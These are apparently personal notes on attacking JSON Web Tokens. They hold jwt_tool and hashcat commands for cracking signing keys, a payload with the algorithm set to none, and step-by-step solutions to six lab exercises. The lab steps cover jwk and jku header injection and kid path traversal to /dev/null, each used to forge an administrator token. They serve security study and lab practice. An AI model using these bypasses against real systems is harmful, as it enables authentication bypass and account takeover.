
JSON web tokens (JWTs) use to send cryptographically signed JSON data, and most commonly used to send information ("claims") about users as part of authentication, session handling, and access control.


**JWT header** parameters:

- `jwk` (JSON Web Key)—JSON object representing the key
- `jku` (JSON Web Key Set URL)—URL containing the key
- `kid` (Key ID) — used to identify the correct key (if more than one)


- [ ]    run  JWT tool in `all mode`

``` BASH
python3 jwt_tool.py -M at \
    -t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
    -rh "Authorization: Bearer eyJhbG...<JWT Token>"
```

u can search the request in your proxy or dump the used JWT:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"

```


- [ ] crack with  hackcat


command to crack payload secret key 
```BASH
hashcat -a 0 -m 16500 <jwt> <wordlist>
```

--show after crack to show the result  `<jwt> : <secretkey>`

### Attacks

- [ ]  Using `None` as the algorithm 

```json
{  
  "typ": "JWT",  
  "alg": "none"  
}
```


- [ ] Using symmetric encryption (HMAC) instead of asymmetric RSA




- generate a key with empty key  , kid is used to check the key id if the key is correct bfore verification hence what we can do is that take kid  and use a path traversal to dev/null and generate a symmetry key with empty key hence it will verify correct 



# LAB

### 1. JWT authentication bypass via unverified signature

 Simply change "sub" to administrator

### 2. JWT authentication bypass via flawed signature verification


 None algorithm (set "alg": "none" and delete signature part)

### 3. JWT authentication bypass via weak signing key


>Weak key is easily detected by Burp Suite Passive Scanner

 Crack signing key with hashcat: `hashcat -m 16500 -a 0 <full_jwt> /usr/share/wordlists/rockyou.txt`

### 4. JWT authentication bypass via jwk header injection



 4.1 Go to JWT Editor Keys - New RSA Key - Generate  
 4.2 Get Request with JWT token - Repeater - JSON Web Token tab - Attack (at the bottom) - Embedded JWK - Select your previously generated key - OK

### 5. JWT authentication bypass via jku header injection



 5.1 JWT Editor Keys - New RSA Key - Generate - right-click on key - Copy Public Key as JWK  
 5.2 Go to your exploit server and paste the next payload in Body:

```
{
    "keys": [

    ]
}
```

 5.3 In "keys" section paste your previously copied JWK:

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
        }
    ]
}
```

5.4 Back to our JWT, replace the current value of the kid parameter with the kid of the JWK that you uploaded to the exploit server.  
 5.5 Add a new jku parameter to the header of the JWT. Set its value to the URL of your JWK Set on the exploit server.  
5.6 Change "sub" to administrator  
 5.7 Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key

### 6. JWT authentication bypass via kid header path traversal



 6.1 JWT Editor Keys - New Symmetric Key - Generate - replace the value of "k" parameter to AA== - OK  
 6.2 Back to our JWT, replace "kid" parameter with ../../../../../dev/null  
 6.3 Change "sub" to administrator  
 6.4 Click "Sign" at the bottom of JSON Web Token tab in repeater and select your previously generated key
